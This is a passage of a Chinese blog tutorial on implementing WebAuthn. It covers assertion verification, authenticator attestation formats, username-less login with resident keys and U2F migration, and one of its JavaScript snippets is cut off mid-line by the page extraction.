ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\n{\n    alg, // 算法\n    sig // 签名\n}\n// 基础或证明 CA 证明\n{\n    alg,\n    sig,\n    x5c // X.509 证书链\n}\n// 椭圆曲线证明\n{\n    alg,\n    sig,\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\n    let pemcert = '';\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    ver: \"200616037\",\n    response: {\n        type: \"Buffer\",\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\n    }\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\n    timestampMs: 1584950686460,\n    apkPackageName: \"com.google.android.gms\",\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\n    ctsProfileMatch: true,\n    apkCertificateDigestSha256: [\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\n    ],\n    basicIntegrity: true,\n    evaluationType: \"BASIC\"\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    alg: \"RS256\",\n    x5c: [\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\n    ]\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\n    publicKey: {\n        ...\n        authenticatorSelection: {\n            requireResidentKey: true,\n            userVerification: \"required\"\n            ...\n        },\n        ...\n    }\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\n    publicKey: {\n        ...\n        userVerification: \"required\",\n        allowCredentials: [],\n        ...\n    }\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\n    appid: \"https://example.com\" //U2F appid\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。 ——我瞎编的 为什么这篇文章的标题是 NLP  […]","link":"https://flyhigher.top/develop/1989.html"}]